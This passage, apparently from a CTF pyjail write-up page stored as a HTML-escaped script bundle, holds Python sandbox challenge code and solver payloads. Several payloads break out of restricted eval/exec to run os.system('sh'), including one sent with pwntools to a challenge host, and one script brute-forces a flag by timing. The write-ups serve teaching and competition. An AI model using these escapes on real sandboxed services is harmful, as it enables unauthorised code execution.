f <span class="token operator">=</span> pyseccomp<span class="token punctuation">.</span>SyscallFilter<span class="token punctuation">(</span>defaction<span class="token operator">=</span>pyseccomp<span class="token punctuation">.</span>KILL<span class="token punctuation">)</span>
f<span class="token punctuation">.</span>add_rule<span class="token punctuation">(</span>pyseccomp<span class="token punctuation">.</span>ALLOW<span class="token punctuation">,</span> <span class="token string">'rt_sigaction'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>add_rule<span class="token punctuation">(</span>pyseccomp<span class="token punctuation">.</span>ALLOW<span class="token punctuation">,</span> <span class="token string">'munmap'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>add_rule<span class="token punctuation">(</span>pyseccomp<span class="token punctuation">.</span>ALLOW<span class="token punctuation">,</span> <span class="token string">'exit_group'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>add_rule<span class="token punctuation">(</span>pyseccomp<span class="token punctuation">.</span>ALLOW<span class="token punctuation">,</span> <span class="token string">'exit'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>add_rule<span class="token punctuation">(</span>pyseccomp<span class="token punctuation">.</span>ALLOW<span class="token punctuation">,</span> <span class="token string">'brk'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">del</span> pyseccomp
<span class="token keyword">del</span> f
<span class="token keyword">del</span> sys

__builtins__ <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token builtin">eval</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>
exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code>`,fo,Wn,it,kt,dc,yo,Vn,ur=`<code class="language-py">__builtins__ <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

some_unknown_and_very_long_identifier_name <span class="token operator">=</span> <span class="token string">"WACON2023&#123;[REDACTED]&#125;"</span></code>`,bo,Gn,rt,_t,yc,mo,$n,ir=`<code class="language-py"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> time
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"critical"</span>

<span class="token comment"># Find the offset for os._wrap_close on server (140)</span>
alph <span class="token operator">=</span> <span class="token string">b"&#123;&#125;0123456789abcdef"</span>
flag <span class="token operator">=</span> <span class="token string">"WACON2023&#123;"</span>
<span class="token comment"># flag = "WACON2023&#123;91d9cec468a8b22b57c2b091beb64bcc&#125;"</span>
index <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token string">"&#125;"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
    <span class="token keyword">for</span> guess <span class="token keyword">in</span> alph<span class="token punctuation">:</span>
        <span class="token comment"># sh = remote("1.234.10.246", 55555)</span>
        sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"python3"</span><span class="token punctuation">,</span> <span class="token string">"og.py"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'''[a:=[].__class__.__base__.__subclasses__()[140].__init__.__builtins__,b:=a["__import__"],c:=b("secret").__dir__()[-1],d:=b("secret").__getattribute__(c),a["exec"]("while True:&#92;n&#92;tpass") if (a["ord"](d[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">]))==</span><span class="token interpolation"><span class="token punctuation">&#123;</span>guess<span class="token punctuation">&#125;</span></span><span class="token string"> else 1]'''</span></span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">:</span>
                index <span class="token operator">+=</span> <span class="token number">1</span>
                flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>guess<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">,</span> flag<span class="token punctuation">)</span>
                sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>
            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span>
        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">:</span>
            index <span class="token operator">+=</span> <span class="token number">1</span>
            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>guess<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">,</span> flag<span class="token punctuation">)</span>
            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># [a:=[].__class__.__base__.__subclasses__()[140].__init__.__builtins__,a["exec"]("while True:&#92;n&#92;tpass") if True else 1]</span></code>`,vo,Xn,da,bc,wo,Kn,ft,dt,mc,go,Zn,kr=`<code class="language-py"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> re
<span class="token keyword">import</span> sys

<span class="token keyword">class</span> <span class="token class-name">Nobuffers</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>stream <span class="token operator">=</span> stream

    <span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">writelines</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> datas<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">&#92;n"</span></span> <span class="token keyword">for</span> data <span class="token keyword">in</span> datas<span class="token punctuation">]</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">__getattr__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> attr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>stream<span class="token punctuation">,</span> attr<span class="token punctuation">)</span>

banned <span class="token operator">=</span> re<span class="token punctuation">.</span>escape<span class="token punctuation">(</span><span class="token string">'\\(~&#125;?>&#123;&amp;/%&#96;)&lt;$|*=#!-+'0123456789;[] '</span><span class="token punctuation">)</span>
stdout <span class="token operator">=</span> Nobuffers<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">)</span>
stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''

        __..,,-----l"|-.
    __/"__  |----""  |  i--voo..,,__
 .-'=|:|/|-------o.,,,---. Y88888888o,,_
_+=:_|_|__|_|   ___|__|___-|  """"&#96;"""&#96;----------.........___
__============:' "" |==|__===========(=>=+    |           ,_, .-"&#96;--..._
  ;="|"|  |"| &#96;.____|__|__/===========(=>=+----+===-|---------&lt;---------_=-
 | ==|:|/| |   | o|.-'__,-|   .'  _______|o  &#96;----'|        __ __,.-'"
  "&#96;--""&#96;--"'"""&#96;.-+------'" .'  _L___,,...-----------"""""""   "
                  &#96;------""""""""

'''</span><span class="token punctuation">)</span>

stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'Enter command: '</span><span class="token punctuation">)</span>
prompt <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> prompt<span class="token punctuation">.</span>isascii<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">not</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>banned<span class="token punctuation">&#125;</span></span><span class="token string">]'</span></span><span class="token punctuation">,</span> prompt<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">exec</span><span class="token punctuation">(</span>prompt<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token string">'__build_class__'</span><span class="token punctuation">:</span> __build_class__<span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">:</span>__name__<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span></code>`,Eo,Jn,yt,bt,vc,ho,Qn,rr=`<code class="language-py"><span class="token comment"># @quasar - eval("__import__('os').system('sh')")</span>
a <span class="token operator">=</span> <span class="token triple-quoted-string string">"""@__build_class__.__self__.eval
@__build_class__.__self__.bytes
@__build_class__.__self__.copyright._Printer__filenames.__add__
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@__build_class__.__self__.chr
@__build_class__.__self__.len
@__build_class__.__self__.StopAsyncIteration.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EnvironmentError.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@"sh".format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EnvironmentError.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EncodingWarning.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@".system".format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@__build_class__.__self__.chr
@__build_class__.__self__.len
@__build_class__.__self__.StopAsyncIteration.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EnvironmentError.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@"os".format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EnvironmentError.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EncodingWarning.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@"__build_class__.__self__.__import__".format
class\fa:..."""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&#92;n"</span><span class="token punctuation">,</span> <span class="token string">"&#92;r"</span><span class="token punctuation">)</span>

<span class="token comment"># @st4rn</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"starship-1.chal.crewc.tf"</span><span class="token punctuation">,</span> <span class="token number">40003</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'@__build_class__.__self__.exec&#92;r@__build_class__.__self__.input&#92;rclass\fx:pass'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'__build_class__.__self__.__import__("os").system("sh")'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,xo,ns,ya,wc,Ao,ss,mt,vt,gc,Co,as,_r=`<code class="language-py"><span class="token comment"># @quasar - setting sys.stdout.flush to breakpoint</span>
<span class="token punctuation">[</span><span class="token builtin">id</span> <span class="token keyword">for</span> sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">.</span>__self__<span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span>mA<span class="token punctuation">]</span> <span class="token keyword">for</span> aA<span class="token punctuation">,</span>bA<span class="token punctuation">,</span>cA<span class="token punctuation">,</span>dA<span class="token punctuation">,</span>eA<span class="token punctuation">,</span>fA<span class="token punctuation">,</span>gA<span class="token punctuation">,</span>hA<span class="token punctuation">,</span>iA<span class="token punctuation">,</span>jA<span class="token punctuation">,</span>kA<span class="token punctuation">,</span>lA<span class="token punctuation">,</span>mA<span class="token punctuation">,</span>nA<span class="token punctuation">,</span>oA<span class="token punctuation">,</span>pA<span class="token punctuation">,</span>qA<span class="token punctuation">,</span>rA<span class="token punctuation">,</span>sA<span class="token punctuation">,</span>tA<span class="token punctuation">,</span>uA<span class="token punctuation">,</span>vA<span class="token punctuation">,</span>wA<span class="token punctuation">,</span>xA<span class="token punctuation">,</span>yA<span class="token punctuation">,</span>zA<span class="token punctuation">,</span>aB<span class="token punctuation">,</span>bB<span class="token punctuation">,</span>cB<span class="token punctuation">,</span>dB<span class="token punctuation">,</span>eB<span class="token punctuation">,</span>fB<span class="token punctuation">,</span>gB<span class="token punctuation">,</span>hB<span class="token punctuation">,</span>iB<span class="token punctuation">,</span>jB<span class="token punctuation">,</span>kB<span class="token punctuation">,</span>lB<span class="token punctuation">,</span>mB<span class="token punctuation">,</span>nB<span class="token punctuation">,</span>oB<span class="token punctuation">,</span>pB<span class="token punctuation">,</span>qB<span class="token punctuation">,</span>rB<span class="token punctuation">,</span>sB<span class="token punctuation">,</span>tB<span class="token punctuation">,</span>uB<span class="token punctuation">,</span>vB<span class="token punctuation">,</span>wB<span class="token punctuation">,</span>xB<span class="token punctuation">,</span>yB<span class="token punctuation">,</span>zB<span class="token punctuation">,</span>aC<span class="token punctuation">,</span>bC<span class="token punctuation">,</span>cC<span class="token punctuation">,</span>dC<span class="token punctuation">,</span>eC<span class="token punctuation">,</span>fC<span class="token punctuation">,</span>gC<span class="token punctuation">,</span>hC<span class="token punctuation">,</span>iC<span class="token punctuation">,</span>jC<span class="token punctuation">,</span>kC<span class="token punctuation">,</span>lC<span class="token punctuation">,</span>mC<span class="token punctuation">,</span>nC<span class="token punctuation">,</span>oC<span class="token punctuation">,</span>pC<span class="token punctuation">,</span>qC<span class="token punctuation">,</span>rC<span class="token punctuation">,</span>sC<span class="token punctuation">,</span>tC<span class="token punctuation">,</span>uC<span class="token punctuation">,</span>vC<span class="token punctuation">,</span>wC<span class="token punctuation">,</span>xC<span class="token punctuation">,</span>yC<span class="token punctuation">,</span>zC<span class="token punctuation">,</span>aD<span class="token punctuation">,</span>bD<span class="token punctuation">,</span>cD<span class="token punctuation">,</span>dD<span class="token punctuation">,</span>eD<span class="token punctuation">,</span>fD<span class="token punctuation">,</span>gD<span class="token punctuation">,</span>hD<span class="token punctuation">,</span>iD<span class="token punctuation">,</span>jD<span class="token punctuation">,</span>kD<span class="token punctuation">,</span>lD<span class="token punctuation">,</span>mD<span class="token punctuation">,</span>nD<span class="token punctuation">,</span>oD<span class="token punctuation">,</span>pD<span class="token punctuation">,</span>qD<span class="token punctuation">,</span>rD<span class="token punctuation">,</span>sD<span class="token punctuation">,</span>tD<span class="token punctuation">,</span>uD<span class="token punctuation">,</span>vD<span class="token punctuation">,</span>wD<span class="token punctuation">,</span>xD<span class="token punctuation">,</span>yD<span class="token punctuation">,</span>zD<span class="token punctuation">,</span>aE<span class="token punctuation">,</span>bE<span class="token punctuation">,</span>cE<span class="token punctuation">,</span>dE<span class="token punctuation">,</span>eE<span class="token punctuation">,</span>fE<span class="token punctuation">,</span>gE<span class="token punctuation">,</span>hE<span class="token punctuation">,</span>iE<span class="token punctuation">,</span>jE<span class="token punctuation">,</span>kE<span class="token punctuation">,</span>lE<span class="token punctuation">,</span>mE<span class="token punctuation">,</span>nE<span class="token punctuation">,</span>oE<span class="token punctuation">,</span>pE<span class="token punctuation">,</span>qE<span class="token punctuation">,</span>rE<span class="token punctuation">,</span>sE<span class="token punctuation">,</span>tE<span class="token punctuation">,</span>uE<span class="token punctuation">,</span>vE<span class="token punctuation">,</span>wE<span class="token punctuation">,</span>xE<span class="token punctuation">,</span>yE<span class="token punctuation">,</span>zE<span class="token punctuation">,</span>aF<span class="token punctuation">,</span>bF<span class="token punctuation">,</span>cF<span class="token punctuation">,</span>dF<span class="token punctuation">,</span>eF<span class="token punctuation">,</span>fF<span class="token punctuation">,</span>gF<span class="token punctuation">,</span>hF<span class="token punctuation">,</span>iF<span class="token punctuation">,</span>jF<span class="token punctuation">,</span>kF<span class="token punctuation">,</span>lF<span class="token punctuation">,</span>mF<span class="token punctuation">,</span>nF<span class="token punctuation">,</span>oF<span class="token punctuation">,</span>pF<span class="token punctuation">,</span>qF<span class="token punctuation">,</span>rF<span class="token punctuation">,</span>sF<span class="token punctuation">,</span>tF<span class="token punctuation">,</span>uF<span class="token punctuation">,</span>vF<span class="token punctuation">,</span>wF<span class="token punctuation">,</span>xF<span class="token punctuation">,</span>yF<span class="token punctuation">,</span>zF<span class="token punctuation">,</span>aG <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">.</span>__self__<span class="token punctuation">.</span>__dict__<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>

<span class="token comment"># @st4rn - os.system("sh")</span>
<span class="token punctuation">[</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> re<span class="token punctuation">.</span>RegexFlag<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> re<span class="token punctuation">.</span>RegexFlag<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>get<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> re<span class="token punctuation">.</span>RegexFlag<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">[</span><span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span>re<span class="token punctuation">.</span>X<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>U<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>M<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>L<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>I<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>T<span class="token punctuation">.</span>value<span class="token punctuation">,</span> re<span class="token punctuation">.</span>X<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>U<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>S<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>I<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>T<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> re<span class="token punctuation">.</span>RegexFlag<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">bytearray</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>M<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>L<span class="token punctuation">.</span>value<span class="token punctuation">:</span>re<span class="token punctuation">.</span>I<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>L<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>M<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> re<span class="token punctuation">.</span>RegexFlag<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">[</span><span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span>re<span class="token punctuation">.</span>X<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>U<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>S<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>I<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>T<span class="token punctuation">.</span>value<span class="token punctuation">,</span> re<span class="token punctuation">.</span>X<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>U<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>M<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> re<span class="token punctuation">.</span>RegexFlag<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">bytearray</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>M<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>L<span class="token punctuation">.</span>value<span class="token punctuation">:</span>re<span class="token punctuation">.</span>I<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>L<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>M<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code>`,Lo,ts,ba,Ec,To,ps,wt,gt,hc,Fo,os,fr=`<code class="language-py"><span class="token comment"># @Satoooon - https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&amp;type=code</span>
<span class="token keyword">import</span><span class="token punctuation">:</span> ctypes<span class="token punctuation">.</span>_aix
path<span class="token punctuation">:</span> <span class="token punctuation">.</span>__loader__<span class="token punctuation">.</span>exec_module<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"ctypes._aix"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">"PYTHONINSPECT"</span><span class="token punctuation">]</span>
value<span class="token punctuation">:</span> <span class="token string">"1"</span>

<span class="token comment"># @maple3142</span>
<span class="token keyword">import</span><span class="token punctuation">:</span> main
<span class="token keyword">import</span><span class="token punctuation">:</span> os
path<span class="token punctuation">:</span> <span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"help"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__repr__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>DISALLOWED_WORDS
value<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
path<span class="token punctuation">:</span> <span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"help"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__repr__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"os"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">"PYTHONINSPECT"</span><span class="token punctuation">]</span>
value<span class="token punctuation">:</span> <span class="token string">"1"</span></code>`,Ho,es,ma,xc,Ro,cs,Et,ht,Ac,Do,ls,dr='<code class="language-py"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"code> "</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code>',Io,us,xt,At,Cc,Po,is,yr='<code class="language-py"><span class="token comment"># 